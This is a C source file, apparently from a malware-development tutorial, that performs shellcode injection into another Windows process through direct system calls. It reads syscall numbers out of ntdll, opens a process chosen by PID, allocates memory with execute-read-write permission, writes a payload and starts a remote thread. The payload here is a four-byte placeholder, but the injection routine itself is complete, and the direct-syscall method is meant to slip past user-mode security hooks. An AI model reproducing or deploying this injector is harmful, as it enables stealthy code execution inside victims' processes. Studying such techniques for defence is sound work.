/*------------------------------------------------------------------------------------------------------
@author     crow
@brief      use system calls directly to perform shellcode injection
@site       https://www.crow.rip/crows-nest/mal/dev/inject/syscalls/direct-syscalls
@inspiration  @VirtualAllocEx (RedOps)
------------------------------------------------------------------------------------------------------*/

#include "glassBox.h"

DWORD NtCloseSSN;
DWORD NtOpenProcessSSN;
DWORD NtCreateThreadExSSN;
DWORD NtWriteVirtualMemorySSN;
DWORD NtWaitForSingleObjectSSN;
DWORD NtAllocateVirtualMemorySSN;

/*-----------[GET MODULE]-----------*/
HMODULE getMod(IN LPCWSTR modName) {

    HMODULE hModule = NULL;

    info("trying to get a handle to %S...", modName);
    hModule = GetModuleHandleW(modName);

    if (hModule == NULL) {
        warn("failed to get a handle to the module, error: 0x%lx\n", GetLastError());
        return NULL;
    }

    else {
        okay("got a handle to the module!");
        info("\\___[ %S\n\t\\_0x%p]\n", modName, hModule);
        return hModule;
    }

}

/*-----------[SEEK SYSCALLS]-----------*/
// special thanks to: Daniel Feichter (@VirtualAllocEx) <3 https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls
DWORD GetSSN(IN HMODULE hNTDLL, IN LPCSTR NtFunction) {

    DWORD NtFunctionSSN = NULL;
    UINT_PTR NtFunctionAddress = NULL;

    info("trying to get the address of %s...", NtFunction);
    NtFunctionAddress = (UINT_PTR)GetProcAddress(hNTDLL, NtFunction);

    if (NtFunctionAddress == NULL) {
        warn("failed to get the address of %s", NtFunction);
        return NULL;
    }

    okay("got the address of %s!", NtFunction);
    info("getting SSN of %s...", NtFunction);
    NtFunctionSSN = ((PBYTE)(NtFunctionAddress + 4))[0];
    okay("\\___[\n\t| %s\n\t| 0x%p+0x4\n\t|____________________0x%lx]\n", NtFunction, NtFunctionAddress, NtFunctionSSN);
    return NtFunctionSSN;

}

int main(int argc, char* argv[]) {

    DWORD    PID      = 0;
    HMODULE  hNTDLL   = NULL;
    NTSTATUS STATUS   = NULL;
    PVOID    rBuffer  = NULL;
    HANDLE   hThread  = NULL;
    HANDLE   hProcess = NULL;

    const UCHAR crowPuke[] = { 0xDE, 0xAD, 0xBE, 0xEF };

    SIZE_T crowPukeSize = sizeof(crowPuke);
    SIZE_T bytesWritten = 0;

    if (argc < 2) {
        warn("usage: %s <process>", argv[0]);
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);
    CLIENT_ID CID = { (HANDLE)PID, 0 };
    OBJECT_ATTRIBUTES OA = { sizeof(OA), 0 };

    printf("[>] press <enter> to begin execution ");
    (void)getchar();

    /*--------[GET SYSCALLS]--------*/
    hNTDLL = getMod(L"NTDLL");
    NtOpenProcessSSN = GetSSN(hNTDLL, "NtOpenProcess");
    NtAllocateVirtualMemorySSN = GetSSN(hNTDLL, "NtAllocateVirtualMemory");
    NtWriteVirtualMemorySSN = GetSSN(hNTDLL, "NtWriteVirtualMemory");
    NtCreateThreadExSSN = GetSSN(hNTDLL, "NtCreateThreadEx");
    NtWaitForSingleObjectSSN = GetSSN(hNTDLL, "NtWaitForSingleObject");
    NtCloseSSN = GetSSN(hNTDLL, "NtClose");

    /*--------[PERFORM INJECTION]--------*/
    okay("got all function syscall numbers, beginning injection...");
    info("getting a handle on the process (%ld)...", PID);
    STATUS = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
    if (!STATUS == STATUS_SUCCESS) {
        warn("[NtOpenProcess] failed to get a handle on the process (%ld), error: 0x%x", PID, STATUS);
        return EXIT_FAILURE;
    }
    okay("got a handle to the process!");
    info("\\___[ hProcess\n\t\\_0x%p]\n", hProcess);

    info("allocating buffer in process memory...");
    STATUS = NtAllocateVirtualMemory(hProcess, &rBuffer, 0, &crowPukeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!STATUS == STATUS_SUCCESS) {
        warn("[NtAllocateVirtualMemory] failed to allocate memory, error: 0x%x", STATUS);
        goto CLEANUP;
    }
    okay("allocated buffer with PAGE_EXECUTE_READWRITE [RWX] permissions!");

    info("writing payload to allocated buffer...");
    // remove this if u want speed, keep this if u wanna r/masterhacker
    for (int i = 0; i < sizeof(crowPuke); i++) {
        if (i % 16 == 0) {
            printf("\n  ");
        }
        Sleep(1);
        printf(" %02X", crowPuke[i]);
    }
    puts("\n");

    STATUS = NtWriteVirtualMemory(hProcess, rBuffer, crowPuke, sizeof(crowPuke), &bytesWritten); /* can't use crowPukeSize here */
    if (!STATUS == STATUS_SUCCESS) {
        warn("[NtWriteVirtualMemory] failed to write to allocated buffer, error: 0x%x", STATUS);
        goto CLEANUP;
    }
    okay("wrote %zu-bytes to allocated buffer!", bytesWritten);

    info("creating thread, beginning execution");
    STATUS = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, rBuffer, NULL, FALSE, 0, 0, 0, NULL);
    if (!STATUS == STATUS_SUCCESS) {
        warn("[NtCreateThreadEx] failed to create thread, error: 0x%x", STATUS);
        goto CLEANUP;
    }
    okay("thread created!");

    /*--------[CLEANUP & EXIT]--------*/
    info("waiting for thread to finish execution");
    STATUS = NtWaitForSingleObject(hThread, FALSE, NULL);
    if (!STATUS == STATUS_SUCCESS) {
        warn("[NtWaitForSingleObject] failed to wait for object (hThread), error: 0x%x", STATUS);
        goto CLEANUP;
    }
    okay("thread finished execution!");

    goto CLEANUP;

CLEANUP:

    info("beginning cleanup...");
    if (hProcess) {
        info("closing handle to process...");
        STATUS = NtClose(hProcess);
        if (!STATUS == STATUS_SUCCESS) {
            warn("[NtClose] failed to close handle, error: 0x%x", STATUS);
            return EXIT_FAILURE;
        }
        okay("closed!");
    }

    if (hThread) {
        info("closing handle to thread...");
        STATUS = NtClose(hThread);
        if (!STATUS == STATUS_SUCCESS) {
            warn("[NtClose] failed to close handle, error: 0x%x", STATUS);
            return EXIT_FAILURE;
        }
        okay("closed!");
    }

    okay("cleanup finished! see ya");
    return EXIT_SUCCESS;

}
